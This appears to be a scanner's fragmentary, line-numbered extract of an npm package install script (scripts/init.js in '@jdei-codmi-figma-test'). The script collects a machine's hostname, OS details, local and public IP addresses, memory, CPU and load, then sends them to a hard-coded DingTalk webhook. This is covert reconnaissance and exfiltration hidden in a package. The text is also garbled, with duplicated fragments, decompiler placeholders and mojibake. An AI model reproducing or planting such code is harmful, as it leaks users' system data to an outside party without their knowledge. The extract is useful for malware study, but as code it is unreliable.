// File: tmp/tmpnvn7ieqi/@jdei-codmi-figma-test/package/scripts/init.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const axios = require('axios')
Line 4: const DINGTALK_WEBHOOK = 'https://oapi.dingtalk.com/robot/send?access_token=d404d56c7c08c75f2c7201f9760ed6ba89845a2a1931369ba0ca20965842d101'
Line 8: for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
Line 9: for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
Line 20: _tmp_0.push("https://ipinfo.io/ip")
Line 21: _tmp_0.push("https://api.ipify.org?format=json")
Line 24: _iterator_2.next()
Line 26: const response = await axios.get(url, {
        timeout: 5000,
        transformResponse: (data) => data
      })
Line 33: url.includes('ipinfo.io')
Line 34: response.data.trim()
Line 35: url.includes('ipify.org')
Line 36: const json = JSON.parse(response.data)
Line 40: /^(\d{1,3}\.){3}\d{1,3}$/.test(ip)
Line 54: {
    hostname: os.hostname(),
    platform: os.platform(),
    release: os.release(),
    arch: os.arch(),
    uptime: `${Math.floor(os.uptime() / 60)} åˆ†é’Ÿ`,
    totalmem: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + ' GB',
    freemem: (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + ' GB',
    cpus: os.cpus()[0]?.model || 'Unknown CPU',
    loadavg: os.loadavg().map(load => load.toFixed(2)),
    localIP: getLocalIP(),
    publicIP
  }
Line 55: os.hostname()
Line 56: os.platform()
Line 58: os.arch()
Line 60: os.totalmem()
Line 62: _tmp_4.cpus = os.cpus()[0]?.model || 'Unknown CPU'
Line 70: `
ã€æ‰§è¡Œè§¦å‘ã€‘æœåŠ¡å™¨åˆå§‹åŒ–ä¿¡æ¯

ğŸ“Œ ä¸»æœºå: ${info.hostname}
ğŸ”§ ç³»ç»Ÿ: ${info.platform} ${info.release} (${info.arch})
ğŸŒ å†…ç½‘IP: ${info.localIP}
ğŸŒ å…¬ç½‘IP: ${info.publicIP}
ğŸ’¾ å†…å­˜: ${info.freemem} / ${info.totalmem}
âš¡ CPU: ${info.cpus}
ğŸ“Š è´Ÿè½½: ${info.loadavg.join(', ')}
â±ï¸  è¿è¡Œæ—¶é—´: ${info.uptime}

ğŸ“… æ—¶é—´: ${new Date().toLocaleString()}
  `.trim()
Line 79: info.loadavg.join(', ')
Line 93: axios.post(DINGTALK_WEBHOOK, payload, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 5000
    })
Line 112: {
    const info = await getSystemInfo();
    await sendToDingTalk({
      ...info,
      hostname: `${info.hostname} [TEST]`,
      uptime: 'æµ‹è¯•è§¦å‘'
    });
  }
Line 114: await sendToDingTalk({
      ...info,
      hostname: `${info.hostname} [TEST]`,
      uptime: 'æµ‹è¯•è§¦å‘'
    })
Line 116: _tmp_16.hostname = <operator>.formatString("", info.hostname, " [TEST]")
Line 134: init()
